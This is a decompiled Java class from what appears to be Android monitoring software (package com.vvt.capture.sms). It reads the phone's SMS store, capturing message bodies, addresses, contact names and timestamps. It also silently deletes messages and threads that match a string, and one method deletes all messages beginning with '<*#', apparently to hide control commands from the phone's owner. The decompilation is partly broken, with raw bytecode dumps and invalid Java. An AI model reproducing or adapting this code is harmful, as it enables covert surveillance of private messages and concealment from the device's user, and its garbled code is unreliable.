package com.vvt.capture.sms.b;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.g;
import com.vvt.capture.sms.SmsData;
import com.vvt.capture.sms.SmsData.Type;
import com.vvt.capture.sms.TextComparisonMode;
import java.util.ArrayList;
import java.util.List;

public class f
  implements com.vvt.base.capture.f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.e;
  private ContentResolver d;
  
  public f(ContentResolver paramContentResolver)
  {
    this.d = paramContentResolver;
  }
  
  private SmsData a(Cursor paramCursor)
  {
    new SmsData();
    Object localObject = "_id";
    int i = paramCursor.getColumnIndex((String)localObject);
    long l1 = paramCursor.getLong(i);
    String str1 = "thread_id";
    int j = paramCursor.getColumnIndex(str1);
    long l2 = paramCursor.getLong(j);
    String str2 = "date";
    int k = paramCursor.getColumnIndex(str2);
    long l3 = paramCursor.getLong(k);
    String str3 = "type";
    int m = paramCursor.getColumnIndex(str3);
    m = paramCursor.getShort(m);
    int n = paramCursor.getColumnIndex("address");
    String str4 = paramCursor.getString(n);
    int i1 = paramCursor.getColumnIndex("body");
    String str5 = paramCursor.getString(i1);
    String str6 = com.vvt.h.f.b(this.d, str4);
    boolean bool = a;
    if (bool) {}
    SmsData localSmsData = new com/vvt/capture/sms/SmsData;
    localSmsData.<init>();
    localSmsData.a(l1);
    localSmsData.c(l2);
    localSmsData.b(l3);
    i = 1;
    if (m == i) {}
    for (localObject = SmsData.Type.IN;; localObject = SmsData.Type.OUT)
    {
      localSmsData.a((SmsData.Type)localObject);
      localSmsData.a(str5);
      localSmsData.c(str4);
      localSmsData.b(str6);
      return localSmsData;
    }
  }
  
  /* Error */
  private boolean a(TextComparisonMode paramTextComparisonMode, String paramString)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_3
    //   2: iconst_0
    //   3: istore 4
    //   5: aconst_null
    //   6: astore 5
    //   8: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   11: istore 6
    //   13: iload 6
    //   15: ifeq +3 -> 18
    //   18: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   21: istore 6
    //   23: iload 6
    //   25: ifeq +3 -> 28
    //   28: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   31: istore 6
    //   33: iload 6
    //   35: ifeq +3 -> 38
    //   38: new 98	java/util/ArrayList
    //   41: astore 7
    //   43: aload 7
    //   45: invokespecial 99	java/util/ArrayList:<init>	()V
    //   48: new 101	java/util/HashSet
    //   51: astore 8
    //   53: aload 8
    //   55: invokespecial 102	java/util/HashSet:<init>	()V
    //   58: new 104	java/lang/StringBuilder
    //   61: astore 9
    //   63: aload 9
    //   65: invokespecial 105	java/lang/StringBuilder:<init>	()V
    //   68: ldc 107
    //   70: astore 10
    //   72: aload 9
    //   74: aload 10
    //   76: invokevirtual 111	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   79: pop
    //   80: ldc 52
    //   82: astore 10
    //   84: aload 9
    //   86: aload 10
    //   88: invokevirtual 111	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   91: pop
    //   92: ldc 113
    //   94: astore 10
    //   96: aload 9
    //   98: aload 10
    //   100: invokevirtual 111	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   103: pop
    //   104: aload_0
    //   105: getfield 31	com/vvt/capture/sms/removeFromPath/f:d	Landroid/content/ContentResolver;
    //   108: astore 10
    //   110: getstatic 118	com/vvt/capture/sms/removeFromPath/a:removeFromPath	Landroid/net/Uri;
    //   113: astore 11
    //   115: aconst_null
    //   116: astore 12
    //   118: aload 9
    //   120: invokevirtual 122	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   123: astore 9
    //   125: iconst_0
    //   126: istore 13
    //   128: aconst_null
    //   129: astore 14
    //   131: aconst_null
    //   132: astore 15
    //   134: aload 10
    //   136: aload 11
    //   138: aconst_null
    //   139: aload 9
    //   141: aconst_null
    //   142: aconst_null
    //   143: invokevirtual 128	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   146: astore 10
    //   148: aload 10
    //   150: ifnull +563 -> 713
    //   153: aload 10
    //   155: invokeinterface 132 1 0
    //   160: istore 16
    //   162: iload 16
    //   164: ifeq +549 -> 713
    //   167: ldc 36
    //   169: astore 11
    //   171: aload 10
    //   173: aload 11
    //   175: invokeinterface 42 2 0
    //   180: istore 16
    //   182: aload 10
    //   184: iload 16
    //   186: invokeinterface 46 2 0
    //   191: lstore 17
    //   193: ldc 64
    //   195: astore 9
    //   197: aload 10
    //   199: aload 9
    //   201: invokeinterface 42 2 0
    //   206: istore 19
    //   208: aload 10
    //   210: iload 19
    //   212: invokeinterface 62 2 0
    //   217: astore 9
    //   219: ldc 48
    //   221: astore 14
    //   223: aload 10
    //   225: aload 14
    //   227: invokeinterface 42 2 0
    //   232: istore 13
    //   234: aload 10
    //   236: iload 13
    //   238: invokeinterface 46 2 0
    //   243: lstore 20
    //   245: aload 9
    //   247: ifnull -94 -> 153
    //   250: getstatic 138	com/vvt/capture/sms/TextComparisonMode:CONTAINS	Lcom/vvt/capture/sms/TextComparisonMode;
    //   253: astore 5
    //   255: aload_1
    //   256: aload 5
    //   258: if_acmpne -105 -> 153
    //   261: aload 9
    //   263: invokevirtual 143	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   266: astore 5
    //   268: aload_2
    //   269: invokevirtual 143	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   272: astore 22
    //   274: aload 5
    //   276: aload 22
    //   278: invokevirtual 147	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   281: istore 4
    //   283: iload 4
    //   285: ifeq +184 -> 469
    //   288: lload 17
    //   290: invokestatic 153	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   293: astore 11
    //   295: aload 7
    //   297: aload 11
    //   299: invokeinterface 159 2 0
    //   304: pop
    //   305: lload 20
    //   307: invokestatic 153	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   310: astore 11
    //   312: aload 8
    //   314: aload 11
    //   316: invokevirtual 160	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   319: pop
    //   320: goto -167 -> 153
    //   323: astore 11
    //   325: getstatic 25	com/vvt/capture/sms/removeFromPath/f:MyUncaughtExceptionHandler	Z
    //   328: istore 16
    //   330: iload 16
    //   332: ifeq +3 -> 335
    //   335: aload 10
    //   337: ifnull +10 -> 347
    //   340: aload 10
    //   342: invokeinterface 163 1 0
    //   347: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   350: istore 6
    //   352: iload 6
    //   354: ifeq +3 -> 357
    //   357: ldc -91
    //   359: astore 11
    //   361: aload 7
    //   363: invokeinterface 169 1 0
    //   368: astore 12
    //   370: aload 12
    //   372: invokeinterface 174 1 0
    //   377: istore 6
    //   379: iload 6
    //   381: ifeq +175 -> 556
    //   384: aload 12
    //   386: invokeinterface 178 1 0
    //   391: astore 10
    //   393: aload 10
    //   395: checkcast 149	java/lang/Long
    //   398: astore 10
    //   400: aload 10
    //   402: invokevirtual 182	java/lang/Long:longValue	()J
    //   405: lstore 23
    //   407: aload_0
    //   408: getfield 31	com/vvt/capture/sms/removeFromPath/f:d	Landroid/content/ContentResolver;
    //   411: astore 10
    //   413: getstatic 118	com/vvt/capture/sms/removeFromPath/a:removeFromPath	Landroid/net/Uri;
    //   416: astore 15
    //   418: iconst_1
    //   419: istore 4
    //   421: iload 4
    //   423: anewarray 140	java/lang/String
    //   426: astore 5
    //   428: aconst_null
    //   429: astore 7
    //   431: lload 23
    //   433: invokestatic 185	java/lang/Long:toString	(J)Ljava/lang/String;
    //   436: astore 9
    //   438: aload 5
    //   440: iconst_0
    //   441: aload 9
    //   443: aastore
    //   444: aload 10
    //   446: aload 15
    //   448: aload 11
    //   450: aload 5
    //   452: invokevirtual 189	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   455: pop
    //   456: getstatic 20	com/vvt/capture/sms/removeFromPath/f:removeFromPath	Z
    //   459: istore 6
    //   461: iload 6
    //   463: ifeq -93 -> 370
    //   466: goto -96 -> 370
    //   469: aload 9
    //   471: invokevirtual 143	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   474: astore 9
    //   476: aload_2
    //   477: invokevirtual 143	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   480: astore 5
    //   482: aload 9
    //   484: aload 5
    //   486: invokevirtual 193	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   489: istore 19
    //   491: iload 19
    //   493: ifeq -340 -> 153
    //   496: lload 17
    //   498: invokestatic 153	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   501: astore 11
    //   503: aload 7
    //   505: aload 11
    //   507: invokeinterface 159 2 0
    //   512: pop
    //   513: lload 20
    //   515: invokestatic 153	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   518: astore 11
    //   520: aload 8
    //   522: aload 11
    //   524: invokevirtual 160	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   527: pop
    //   528: goto -375 -> 153
    //   531: astore 11
    //   533: aload 10
    //   535: astore 5
    //   537: aload 11
    //   539: astore 10
    //   541: aload 5
    //   543: ifnull +10 -> 553
    //   546: aload 5
    //   548: invokeinterface 163 1 0
    //   553: aload 10
    //   555: athrow
    //   556: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   559: istore 6
    //   561: iload 6
    //   563: ifeq +3 -> 566
    //   566: ldc -61
    //   568: astore 11
    //   570: aload 8
    //   572: invokevirtual 196	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   575: astore 12
    //   577: aload 12
    //   579: invokeinterface 174 1 0
    //   584: istore 6
    //   586: iload 6
    //   588: ifeq +88 -> 676
    //   591: aload 12
    //   593: invokeinterface 178 1 0
    //   598: astore 10
    //   600: aload 10
    //   602: checkcast 149	java/lang/Long
    //   605: astore 10
    //   607: aload 10
    //   609: invokevirtual 182	java/lang/Long:longValue	()J
    //   612: lstore 23
    //   614: aload_0
    //   615: getfield 31	com/vvt/capture/sms/removeFromPath/f:d	Landroid/content/ContentResolver;
    //   618: astore 10
    //   620: getstatic 118	com/vvt/capture/sms/removeFromPath/a:removeFromPath	Landroid/net/Uri;
    //   623: astore 15
    //   625: iconst_1
    //   626: istore 4
    //   628: iload 4
    //   630: anewarray 140	java/lang/String
    //   633: astore 5
    //   635: aconst_null
    //   636: astore 7
    //   638: lload 23
    //   640: invokestatic 198	java/lang/String:valueOf	(J)Ljava/lang/String;
    //   643: astore 9
    //   645: aload 5
    //   647: iconst_0
    //   648: aload 9
    //   650: aastore
    //   651: aload 10
    //   653: aload 15
    //   655: aload 11
    //   657: aload 5
    //   659: invokevirtual 189	android/content/ContentResolver:delete	(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    //   662: pop
    //   663: getstatic 20	com/vvt/capture/sms/removeFromPath/f:removeFromPath	Z
    //   666: istore 6
    //   668: iload 6
    //   670: ifeq -93 -> 577
    //   673: goto -96 -> 577
    //   676: iload_3
    //   677: istore 6
    //   679: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   682: istore 16
    //   684: iload 16
    //   686: ifeq +3 -> 689
    //   689: iload 6
    //   691: ireturn
    //   692: astore 10
    //   694: getstatic 25	com/vvt/capture/sms/removeFromPath/f:MyUncaughtExceptionHandler	Z
    //   697: istore 6
    //   699: iload 6
    //   701: ifeq +3 -> 704
    //   704: iconst_0
    //   705: istore 6
    //   707: aconst_null
    //   708: astore 10
    //   710: goto -31 -> 679
    //   713: aload 10
    //   715: ifnull -368 -> 347
    //   718: goto -378 -> 340
    //   721: astore 10
    //   723: goto -182 -> 541
    //   726: astore 10
    //   728: iconst_0
    //   729: istore 6
    //   731: aconst_null
    //   732: astore 10
    //   734: goto -409 -> 325
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	737	0	this	f
    //   0	737	1	paramTextComparisonMode	TextComparisonMode
    //   0	737	2	paramString	String
    //   1	676	3	bool1	boolean
    //   3	626	4	bool2	boolean
    //   6	652	5	localObject1	Object
    //   11	719	6	bool3	boolean
    //   41	596	7	localArrayList	ArrayList
    //   51	520	8	localHashSet	java.util.HashSet
    //   61	588	9	localObject2	Object
    //   70	582	10	localObject3	Object
    //   692	1	10	localSQLiteException1	android.database.sqlite.SQLiteException
    //   708	6	10	localObject4	Object
    //   721	1	10	localObject5	Object
    //   726	1	10	localSQLiteException2	android.database.sqlite.SQLiteException
    //   732	1	10	localObject6	Object
    //   113	202	11	localObject7	Object
    //   323	1	11	localSQLiteException3	android.database.sqlite.SQLiteException
    //   359	164	11	localObject8	Object
    //   531	7	11	localObject9	Object
    //   568	88	11	str1	String
    //   116	476	12	localIterator	java.util.Iterator
    //   126	111	13	i	int
    //   129	97	14	str2	String
    //   132	522	15	localUri	Uri
    //   160	3	16	bool4	boolean
    //   180	5	16	j	int
    //   328	357	16	bool5	boolean
    //   191	306	17	l1	long
    //   206	5	19	k	int
    //   489	3	19	bool6	boolean
    //   243	271	20	l2	long
    //   272	5	22	str3	String
    //   405	234	23	l3	long
    // Exception table:
    //   from	to	target	type
    //   153	160	323	android/database/sqlite/SQLiteException
    //   173	180	323	android/database/sqlite/SQLiteException
    //   184	191	323	android/database/sqlite/SQLiteException
    //   199	206	323	android/database/sqlite/SQLiteException
    //   210	217	323	android/database/sqlite/SQLiteException
    //   225	232	323	android/database/sqlite/SQLiteException
    //   236	243	323	android/database/sqlite/SQLiteException
    //   250	253	323	android/database/sqlite/SQLiteException
    //   261	266	323	android/database/sqlite/SQLiteException
    //   268	272	323	android/database/sqlite/SQLiteException
    //   276	281	323	android/database/sqlite/SQLiteException
    //   288	293	323	android/database/sqlite/SQLiteException
    //   297	305	323	android/database/sqlite/SQLiteException
    //   305	310	323	android/database/sqlite/SQLiteException
    //   314	320	323	android/database/sqlite/SQLiteException
    //   469	474	323	android/database/sqlite/SQLiteException
    //   476	480	323	android/database/sqlite/SQLiteException
    //   484	489	323	android/database/sqlite/SQLiteException
    //   496	501	323	android/database/sqlite/SQLiteException
    //   505	513	323	android/database/sqlite/SQLiteException
    //   513	518	323	android/database/sqlite/SQLiteException
    //   522	528	323	android/database/sqlite/SQLiteException
    //   153	160	531	finally
    //   173	180	531	finally
    //   184	191	531	finally
    //   199	206	531	finally
    //   210	217	531	finally
    //   225	232	531	finally
    //   236	243	531	finally
    //   250	253	531	finally
    //   261	266	531	finally
    //   268	272	531	finally
    //   276	281	531	finally
    //   288	293	531	finally
    //   297	305	531	finally
    //   305	310	531	finally
    //   314	320	531	finally
    //   325	328	531	finally
    //   469	474	531	finally
    //   476	480	531	finally
    //   484	489	531	finally
    //   496	501	531	finally
    //   505	513	531	finally
    //   513	518	531	finally
    //   522	528	531	finally
    //   361	368	692	android/database/sqlite/SQLiteException
    //   370	377	692	android/database/sqlite/SQLiteException
    //   384	391	692	android/database/sqlite/SQLiteException
    //   393	398	692	android/database/sqlite/SQLiteException
    //   400	405	692	android/database/sqlite/SQLiteException
    //   407	411	692	android/database/sqlite/SQLiteException
    //   413	416	692	android/database/sqlite/SQLiteException
    //   421	426	692	android/database/sqlite/SQLiteException
    //   431	436	692	android/database/sqlite/SQLiteException
    //   441	444	692	android/database/sqlite/SQLiteException
    //   450	456	692	android/database/sqlite/SQLiteException
    //   456	459	692	android/database/sqlite/SQLiteException
    //   556	559	692	android/database/sqlite/SQLiteException
    //   570	575	692	android/database/sqlite/SQLiteException
    //   577	584	692	android/database/sqlite/SQLiteException
    //   591	598	692	android/database/sqlite/SQLiteException
    //   600	605	692	android/database/sqlite/SQLiteException
    //   607	612	692	android/database/sqlite/SQLiteException
    //   614	618	692	android/database/sqlite/SQLiteException
    //   620	623	692	android/database/sqlite/SQLiteException
    //   628	633	692	android/database/sqlite/SQLiteException
    //   638	643	692	android/database/sqlite/SQLiteException
    //   648	651	692	android/database/sqlite/SQLiteException
    //   657	663	692	android/database/sqlite/SQLiteException
    //   663	666	692	android/database/sqlite/SQLiteException
    //   58	61	721	finally
    //   63	68	721	finally
    //   74	80	721	finally
    //   86	92	721	finally
    //   98	104	721	finally
    //   104	108	721	finally
    //   110	113	721	finally
    //   118	123	721	finally
    //   142	146	721	finally
    //   58	61	726	android/database/sqlite/SQLiteException
    //   63	68	726	android/database/sqlite/SQLiteException
    //   74	80	726	android/database/sqlite/SQLiteException
    //   86	92	726	android/database/sqlite/SQLiteException
    //   98	104	726	android/database/sqlite/SQLiteException
    //   104	108	726	android/database/sqlite/SQLiteException
    //   110	113	726	android/database/sqlite/SQLiteException
    //   118	123	726	android/database/sqlite/SQLiteException
    //   142	146	726	android/database/sqlite/SQLiteException
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = "(%s = %d OR %s = %d OR %s = %d OR %s = %d)";
    int j = 8;
    boolean bool2;
    try
    {
      Object localObject3 = new Object[j];
      int k = 0;
      Object localObject4 = "type";
      localObject3[0] = localObject4;
      k = 1;
      int m = 1;
      localObject4 = Integer.valueOf(m);
      localObject3[k] = localObject4;
      k = 2;
      localObject4 = "type";
      localObject3[k] = localObject4;
      k = 3;
      m = 2;
      localObject4 = Integer.valueOf(m);
      localObject3[k] = localObject4;
      k = 4;
      localObject4 = "type";
      localObject3[k] = localObject4;
      k = 5;
      m = 4;
      localObject4 = Integer.valueOf(m);
      localObject3[k] = localObject4;
      k = 6;
      localObject4 = "type";
      localObject3[k] = localObject4;
      k = 7;
      m = 6;
      localObject4 = Integer.valueOf(m);
      localObject3[k] = localObject4;
      localObject4 = String.format((String)localObject1, (Object[])localObject3);
      int i = -1;
      if (paramInt == i) {
        paramInt = -1 >>> 1;
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject3 = "_id DESC LIMIT ";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
      localObject1 = ((StringBuilder)localObject1).append(paramInt);
      String str = ((StringBuilder)localObject1).toString();
      localObject1 = this.d;
      localObject3 = a.b;
      k = 0;
      localObject1 = ((ContentResolver)localObject1).query((Uri)localObject3, null, (String)localObject4, null, str);
      if (localObject1 != null)
      {
        for (;;)
        {
          boolean bool3 = ((Cursor)localObject1).moveToNext();
          if (!bool3) {
            break;
          }
          localObject3 = a((Cursor)localObject1);
          localArrayList.add(localObject3);
        }
        bool2 = a;
      }
    }
    finally
    {
      bool2 = c;
      if (!bool2) {}
    }
    for (;;)
    {
      if (bool2) {}
      return localArrayList;
      if (localObject2 != null) {
        ((Cursor)localObject2).close();
      }
    }
  }
  
  public List a(g paramg1, g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = (Long)paramg1.getReference();
    long l = ((Long)localObject1).longValue();
    boolean bool2 = b;
    if (bool2) {}
    String str = "(%s = %d OR %s = %d OR %s = %d OR %s = %d) AND %s > %d";
    int i = 10;
    try
    {
      Object localObject3 = new Object[i];
      int j = 0;
      Object localObject4 = "type";
      localObject3[0] = localObject4;
      j = 1;
      int k = 1;
      localObject4 = Integer.valueOf(k);
      localObject3[j] = localObject4;
      j = 2;
      localObject4 = "type";
      localObject3[j] = localObject4;
      j = 3;
      k = 2;
      localObject4 = Integer.valueOf(k);
      localObject3[j] = localObject4;
      j = 4;
      localObject4 = "type";
      localObject3[j] = localObject4;
      j = 5;
      k = 4;
      localObject4 = Integer.valueOf(k);
      localObject3[j] = localObject4;
      j = 6;
      localObject4 = "type";
      localObject3[j] = localObject4;
      j = 7;
      k = 6;
      localObject4 = Integer.valueOf(k);
      localObject3[j] = localObject4;
      j = 8;
      localObject4 = "_id";
      localObject3[j] = localObject4;
      j = 9;
      localObject1 = Long.valueOf(l);
      localObject3[j] = localObject1;
      localObject3 = String.format(str, (Object[])localObject3);
      localObject1 = this.d;
      Object localObject5 = a.b;
      bool2 = false;
      str = null;
      j = 0;
      k = 0;
      localObject4 = null;
      localObject1 = ((ContentResolver)localObject1).query((Uri)localObject5, null, (String)localObject3, null, null);
      if (localObject1 != null)
      {
        for (;;)
        {
          boolean bool3 = ((Cursor)localObject1).moveToNext();
          if (!bool3) {
            break;
          }
          localObject5 = a((Cursor)localObject1);
          localArrayList.add(localObject5);
        }
        bool1 = a;
      }
    }
    finally
    {
      bool1 = c;
      if (!bool1) {}
    }
    for (;;)
    {
      if (bool1) {}
      return localArrayList;
      if (localObject2 != null) {
        ((Cursor)localObject2).close();
      }
    }
  }
  
  public boolean a(String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    TextComparisonMode localTextComparisonMode = TextComparisonMode.CONTAINS;
    bool1 = a(localTextComparisonMode, paramString);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return bool1;
  }
  
  public FxSimpleEventReference b()
  {
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    Long localLong = Long.valueOf(c());
    localFxSimpleEventReference.setReference(localLong);
    return localFxSimpleEventReference;
  }
  
  /* Error */
  public long c()
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: aconst_null
    //   5: astore_3
    //   6: iconst_m1
    //   7: i2l
    //   8: lstore 4
    //   10: iconst_1
    //   11: istore 6
    //   13: iload 6
    //   15: anewarray 140	java/lang/String
    //   18: astore 7
    //   20: ldc 36
    //   22: astore 8
    //   24: aload 7
    //   26: iconst_0
    //   27: aload 8
    //   29: aastore
    //   30: ldc -4
    //   32: astore 9
    //   34: aload_0
    //   35: getfield 31	com/vvt/capture/sms/removeFromPath/f:d	Landroid/content/ContentResolver;
    //   38: astore 8
    //   40: getstatic 118	com/vvt/capture/sms/removeFromPath/a:removeFromPath	Landroid/net/Uri;
    //   43: astore_2
    //   44: aload 8
    //   46: aload_2
    //   47: aload 7
    //   49: aconst_null
    //   50: aconst_null
    //   51: aload 9
    //   53: invokevirtual 128	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   56: astore 7
    //   58: aload 7
    //   60: ifnull +129 -> 189
    //   63: aload 7
    //   65: invokeinterface 255 1 0
    //   70: istore 6
    //   72: iload 6
    //   74: ifeq +115 -> 189
    //   77: iconst_0
    //   78: istore 6
    //   80: aconst_null
    //   81: astore 8
    //   83: aload 7
    //   85: iconst_0
    //   86: invokeinterface 46 2 0
    //   91: lstore 4
    //   93: lload 4
    //   95: lstore 10
    //   97: aload 7
    //   99: ifnull +10 -> 109
    //   102: aload 7
    //   104: invokeinterface 163 1 0
    //   109: getstatic 17	com/vvt/capture/sms/removeFromPath/f:a	Z
    //   112: istore 12
    //   114: iload 12
    //   116: ifeq +3 -> 119
    //   119: lload 10
    //   121: lreturn
    //   122: astore 8
    //   124: iconst_0
    //   125: istore 6
    //   127: aconst_null
    //   128: astore 8
    //   130: getstatic 25	com/vvt/capture/sms/removeFromPath/f:MyUncaughtExceptionHandler	Z
    //   133: istore_1
    //   134: iload_1
    //   135: ifeq +3 -> 138
    //   138: aload 8
    //   140: ifnull +10 -> 150
    //   143: aload 8
    //   145: invokeinterface 163 1 0
    //   150: lload 4
    //   152: lstore 10
    //   154: goto -45 -> 109
    //   157: aload_3
    //   158: ifnull +9 -> 167
    //   161: aload_3
    //   162: invokeinterface 163 1 0
    //   167: aload 8
    //   169: athrow
    //   170: astore_2
    //   171: aload 8
    //   173: astore_3
    //   174: aload_2
    //   175: astore 8
    //   177: goto -20 -> 157
    //   180: astore 8
    //   182: aload 7
    //   184: astore 8
    //   186: goto -56 -> 130
    //   189: lload 4
    //   191: lstore 10
    //   193: goto -96 -> 97
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	196	0	this	f
    //   1	134	1	bool1	boolean
    //   3	44	2	localUri	Uri
    //   170	5	2	localObject1	Object
    //   5	169	3	localObject2	Object
    //   8	182	4	l1	long
    //   11	115	6	bool2	boolean
    //   18	165	7	localObject3	Object
    //   22	60	8	localObject4	Object
    //   122	1	8	localObject5	Object
    //   128	48	8	localObject6	Object
    //   180	1	8	localObject7	Object
    //   184	1	8	localObject8	Object
    //   32	20	9	str	String
    //   95	97	10	l2	long
    //   112	3	12	bool3	boolean
    // Exception table:
    //   from	to	target	type
    //   34	38	122	finally
    //   40	43	122	finally
    //   51	56	122	finally
    //   130	133	170	finally
    //   63	70	180	finally
    //   85	91	180	finally
  }
  
  public void d()
  {
    boolean bool = a;
    if (bool) {}
    String str = "<*#";
    TextComparisonMode localTextComparisonMode = TextComparisonMode.STARTWITH;
    a(localTextComparisonMode, str);
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/removeFromPath/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */